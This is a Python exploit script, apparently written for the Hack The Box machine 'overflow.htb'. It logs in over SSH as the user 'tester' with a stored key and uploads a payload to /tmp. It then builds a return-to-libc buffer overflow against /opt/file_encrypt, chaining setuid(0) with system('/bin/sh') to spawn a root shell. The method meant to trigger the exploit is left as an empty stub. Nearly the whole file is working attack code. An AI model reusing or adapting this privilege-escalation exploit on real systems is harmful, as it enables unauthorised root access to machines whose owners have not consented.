#!/usr/bin/env python3

import io
import paramiko
import struct

from common_tools import Colors
import settings


class Tester_to_root(object):
    """docstring for Tester_to_root"""
    
    def __init__(self):

        self.username = "tester"
        self.remote_payload = '/tmp/'+settings.final_payload_name
        self.remote_script = '/opt/file_encrypt/file_encrypt'
        self._private_key = None
        self.__init_private_key()
        self._ssh_handler = None
        self.__init_ssh_handler()
        self._ssh_handler.connect("overflow.htb", 22, timeout = 10, username=self.username, pkey=self._private_key)

    def __del__(self):
        if isinstance(self._ssh_handler, paramiko.client.SSHClient):
            self._ssh_handler.close()
            self._ssh_handler = None

    def __init_private_key(self):
        """
            Retrieve previous generated private key to connect to server
        """
        f = open(settings.rsa_key['priv'],'r')
        s = f.read()
        keyfile = io.StringIO(s)
        self._private_key = paramiko.RSAKey.from_private_key(keyfile)

    def __init_ssh_handler(self):
        self._ssh_handler = paramiko.SSHClient()
        self._ssh_handler.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def __del__(self):
        if self._ssh_handler and isinstance(self._ssh_handler, paramiko.client.SSHClient):
            self._ssh_handler.close()
            self._ssh_handler = None

    def upload_payload(self):
        """
            Upload our local pyaload to remote host
        """
        print(Colors.begin_info+"Uploading final payload")
        ftp_client = self._ssh_handler.open_sftp()
        ftp_client.put(settings.payloads_folder+settings.final_payload_name, self.remote_payload)
        ftp_client.close()
        print(Colors.begin_success+"Upload successfull !")

    def becoming_root(self):
        """
            Need to find a way to do this...
        """
        pass



def gen_payload():
    """
        Generate specific payload inside a file. Then it will be uploaded to remote server en finally launched.
    """
    payload_location = settings.payloads_folder+settings.final_payload_name
    #extracted from _init function
    pop_ebx_ret=0x565555c5

    #setuid
    setuid = 0xf7ea8f10
    setuid_arg = 0

    #then call shell
    system = 0xf7e262e0
    exit = 0xf7e194b0
    bin_sh = 0xf7f670af

    fake_pin = b'-202976456'

    before_eip=b'A'*44

    payload = b""
    payload += fake_pin+before_eip

    #add setuid to gain root access
    payload += struct.pack("<I", setuid)
    payload += struct.pack("<I", pop_ebx_ret) #pop ret here
    payload += struct.pack("<I", setuid_arg)

    #then pop shell
    payload += struct.pack("<I", system)
    payload += struct.pack("<I", exit)
    payload += struct.pack("<I", bin_sh)

    print(Colors.begin_success+"Generating payload : "+Colors.colorize(payload_location, 'YELLOW'))
    with open(payload_location, 'w+b') as f:
        f.write(payload)